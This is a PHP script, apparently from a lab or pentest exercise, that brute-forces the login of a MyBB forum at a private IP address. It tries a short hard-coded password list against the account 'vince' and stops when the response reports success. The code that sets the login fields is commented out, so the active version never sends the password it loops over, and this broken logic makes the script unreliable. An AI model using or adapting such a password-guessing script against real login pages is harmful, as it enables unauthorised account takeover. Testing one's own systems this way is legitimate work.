<?php


require_once 'HTTP/Request2.php';

use \HTTP;

/**
 * @param $password
 * @return HTTP_Request2
 */
function getRequest($params,$password)
{
    $req = new HTTP_Request2('http://172.16.129.128/mybb/member.php', HTTP_Request2::METHOD_POST);

    foreach($params as $key=>$param) {
        foreach ($param as $value) {
            switch ($key) {
                case 'Header':
                    $req->setHeader($value);
            }
        }
    }
        /*
            $req->addCookie('XDEBUG_SESSION', 'XDEBUG_ECLIPSE');

            $req->setHeader('User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36');
            $req->setHeader('Connection:keep-alive');


            $req->addPostParameter('action', 'do_login');
            $req->addPostParameter('url', 'http://172.16.129.128/mybb/index.php');
            $req->addPostParameter('quick_login', '1');
            $req->addPostParameter('quick_username', 'vince');
            $req->addPostParameter('quick_password', $password);
            $req->addPostParameter('quick_remember', 'no');
            $req->addPostParameter('submit', 'Login');

        */
        return $req;
    }

$passwords = Array(
    'wald',
    'echo',
    'test',
    'underdev',
    'master'
);


echo PHP_EOL;


$filename = "../profiles/test.json";
$handle = fopen($filename, "r");
$params = json_decode(fread($handle,filesize($filename)));
fclose($handle);



foreach ($passwords as $password) {



    echo 'Trying password: ' . $password . PHP_EOL;

    $req = getRequest($params, $password);



    try {
        $response = $req->send();




        echo '-> Return Code: ' . $response->getStatus() . PHP_EOL;



        if (strpos($response->getBody(),"successfully")){
            echo '*******login succeed********';
            echo PHP_EOL;
            break;
        };


        //echo $response->getBody();

        echo PHP_EOL;



        /*
        if (200 == $response->getStatus()) {
            echo $response->getBody();
        } else {
            echo 'Unexpected HTTP status: ' . $response->getStatus() . ' ' .
                $response->getReasonPhrase();
        }
        */


    } catch (HTTP_Request2_Exception $e) {
        echo 'Error: ' . $e->getMessage();
    }
}

echo PHP_EOL;
